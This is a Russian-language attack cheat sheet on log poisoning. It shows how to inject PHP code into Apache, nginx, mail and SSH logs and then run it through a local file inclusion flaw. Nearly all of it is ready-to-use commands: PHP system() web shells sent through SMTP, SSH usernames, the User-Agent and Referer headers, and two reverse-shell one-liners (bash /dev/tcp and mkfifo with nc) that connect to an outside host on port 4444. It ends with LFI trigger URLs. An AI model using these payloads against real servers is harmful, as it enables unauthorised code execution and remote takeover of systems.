# Log Poisoning — уязвимость, при которой злоумышленник может внедрить вредоносный код в лог-файлы сервера, которые затем могут быть включены через LFI для выполнения кода на сервере.

## Когда возможно:
✅ LFI через include() лог-файлов
✅ Сервер пишет пользовательские данные в логи (User-Agent, Referer)

## Пути к логам:
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/httpd/access.log

# Если работает smtpd, то можно получить доступ к логам от почтового сервера:
/var/log/mail.log

nc target.com 25
HELO target.com
MAIL FROM:<?php system($_GET[‘cmd’]) ?>
или
MAIL FROM:<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.187.139/4444 0>&1'"); ?>

# Для ssh
/var/log/auth.log

ssh <?php system('id'); ?>@ip
или nc ip 22
<?php system('id'); ?>

## Внедрение через User-Agent:
curl -A "<?php phpinfo(); ?>" http://target.com
curl -A "<?php system('id'); ?>" http://target.com
curl -A "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.187.139 4444 >/tmp/f'); ?>" http://target.com

## Через nc:
nc target.com 80
<?php system('id'); ?>

## Проверка через LFI:
http://target.com/?page=/var/log/apache2/mail.log&cmd=ls

## Через Referer:
curl -e "<?php system('id'); ?>" http://target.com

## Проверка через LFI:
http://target.com/?page=/var/log/apache2/access.log

## Важно:
- User-Agent не кодируется → в логах результат выполнения, а не код
- GET-параметры кодируются (%3C%3Fphp)
- Нужны права на чтение логов